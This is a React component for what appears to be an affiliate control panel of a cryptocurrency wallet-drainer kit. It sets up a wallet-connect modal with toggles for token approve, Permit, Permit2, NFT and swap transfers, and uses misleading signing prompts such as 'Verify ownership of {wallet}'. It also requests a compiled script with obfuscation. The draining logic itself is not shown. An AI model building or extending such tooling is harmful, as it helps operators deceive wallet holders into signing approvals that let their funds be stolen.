"use client";

import { useState } from "react";
import { LegacyTopNav } from "@/components/affiliate/legacy-top-nav";
import { LegacySidebar } from "@/components/affiliate/legacy-sidebar";
import { LegacyGeneralTab } from "@/components/affiliate/legacy-general-tab";
import { LegacyDashboardTab } from "@/components/affiliate/legacy-dashboard-tab";
import { LegacyModalTab } from "@/components/affiliate/legacy-modal-tab";
import { LegacyScriptGenerator } from "@/components/affiliate/legacy-script-generator";
import type {
  DashboardSettings,
  ErrorState,
  GeneralSettings,
  MessageStep,
  ModalSettings,
  Tab,
} from "@/components/affiliate/legacy-types";

const defaultGeneral: GeneralSettings = {
  font: "Manrope",
  theme: "light",
  borderRadius: 18,
  fontSize: 14,
  accentColor: "#7C73FF",
  openEvent: "After click on button",
  openTrigger: "Automatic",
};

const defaultDashboard: DashboardSettings = {
  menuItems: ["Domains", "Logs", "Settings", "Compiler"],
  contractMethods: ["Claim", "Execute", "Swap"],
  enableApprove: true,
  enablePermit: true,
  enablePermit2: false,
  enableNFT: false,
  enableSwappers: true,
};

const defaultModal: ModalSettings = {
  selectedModal: "wc3",
  borderRadius: 12,
  overlayBlur: 8,
  accentColor: "#FF2D92",
  supportedWallets: ["MetaMask", "Coinbase", "WalletConnect"],
};

const defaultMessageSteps: MessageStep[] = [
  { id: 1, label: "Connect", text: "Connect your wallet to continue" },
  { id: 2, label: "Thanks", text: "Thank you for connecting!" },
  { id: 3, label: "Sign", text: "Please sign the transaction to confirm" },
];

const defaultErrorStates: ErrorState[] = [
  { id: "generic", label: "Generic Error", title: "Something went wrong", description: "Please try again later", button: "Retry" },
];

export function LegacyAffiliatePanel({
  projectId,
  projectName,
}: {
  projectId: string;
  projectName?: string;
}) {
  const [walletConnected, setWalletConnected] = useState(false);
  const [activeTab, setActiveTab] = useState<Tab>("dashboard");
  const [general, setGeneral] = useState<GeneralSettings>(defaultGeneral);
  const [dashboard, setDashboard] = useState<DashboardSettings>(defaultDashboard);
  const [modal, setModal] = useState<ModalSettings>(defaultModal);
  const [messageSteps, setMessageSteps] = useState<MessageStep[]>(defaultMessageSteps);
  const [errorStates, setErrorStates] = useState<ErrorState[]>(defaultErrorStates);

  const walletStyleMap: Record<string, string> = {
    wc3: "reown",
    wc2: "walletconnect",
    family: "custom",
    rainbow: "rainbowkit",
    saturn: "web3modal",
    mars: "web3modal",
    venus: "custom",
  };

  async function handleGenerate(): Promise<string> {
    const configPayload = {
      projectId,
      general: {
        connectText: "Connect Wallet",
        connectedText: "Connected: {wallet}",
        loadingText: messageSteps.find((step) => step.label === "Processing")?.text || "Verifying...",
        verifyText: messageSteps.find((step) => step.label === "Sign")?.text || "Please confirm in your wallet",
        rejectText: errorStates.find((state) => state.id === "generic")?.title || "Transaction was declined",
        disconnectText: "Disconnect",
        themeMode: general.theme,
        transactionFunctionName: dashboard.contractMethods[0] || "claimReward",
      },
      wallet: {
        supportedWallets: modal.supportedWallets.map((wallet) => wallet.toLowerCase()),
        walletVisibility: modal.supportedWallets.reduce<Record<string, boolean>>((acc, wallet) => {
          acc[wallet.toLowerCase()] = true;
          return acc;
        }, {}),
      },
      modal: {
        modalFrameworkStyle: walletStyleMap[modal.selectedModal] || "custom",
        enableLatestWC: modal.selectedModal === "wc3",
        clickToOpenModal: general.openEvent === "After click on button",
      },
      tokens: {
        contractFunctions: dashboard.contractMethods,
        allowanceExecution: dashboard.enableApprove,
        balanceBasedApproval: dashboard.enablePermit || dashboard.enablePermit2,
        erc721Support: dashboard.enableNFT,
        marketplaceTransfers: dashboard.enableSwappers,
      },
      advanced: {
        signaturePromptText: messageSteps.find((step) => step.label === "Sign")?.text || "Verify ownership of {wallet}",
      },
    };

    const saveResponse = await fetch("/api/affiliate/config", {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(configPayload),
    });
    const saveData = (await saveResponse.json()) as { message?: string };
    if (!saveResponse.ok) throw new Error(saveData?.message || "Failed to save affiliate config");

    const compileResponse = await fetch("/api/affiliate/compile", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ projectId, obfuscationLevel: "medium" }),
    });
    if (!compileResponse.ok) {
      let message = "Failed to compile affiliate script";
      try {
        const compileError = (await compileResponse.json()) as { message?: string };
        message = compileError?.message || message;
      } catch {
        // Keep the default message.
      }
      throw new Error(message);
    }
    return compileResponse.text();
  }

  return (
    <div style={{ minHeight: "100vh", background: "#f7f6f3", fontFamily: "Manrope, sans-serif", display: "flex", flexDirection: "column", margin: "-24px" }}>
      <LegacyTopNav
        walletConnected={walletConnected}
        walletAddress={projectName ? `${projectName} · ${projectId}` : projectId}
        onConnect={() => setWalletConnected(true)}
      />

      <div style={{ flex: 1, display: "flex", overflow: "hidden" }}>
        <LegacySidebar activeTab={activeTab} onTabChange={setActiveTab} />
        <div style={{ flex: 1, display: "flex", flexDirection: "column", overflow: "hidden", background: "#faf9f7" }}>
          <div style={{ flex: 1, overflowY: "auto", padding: "28px 42px", minHeight: 0 }}>
            {activeTab === "general" ? <LegacyGeneralTab settings={general} onChange={setGeneral} /> : null}
            {activeTab === "dashboard" ? <LegacyDashboardTab settings={dashboard} onChange={setDashboard} /> : null}
            {activeTab === "modal" ? (
              <div style={{ display: "flex", flexDirection: "column", gap: 22 }}>
                <LegacyModalTab
                  settings={modal}
                  onChange={setModal}
                  messageSteps={messageSteps}
                  onMessageChange={setMessageSteps}
                  errorStates={errorStates}
                  onErrorChange={setErrorStates}
                />
                <LegacyScriptGenerator onGenerate={handleGenerate} />
              </div>
            ) : null}
          </div>
        </div>
      </div>
    </div>
  );
}
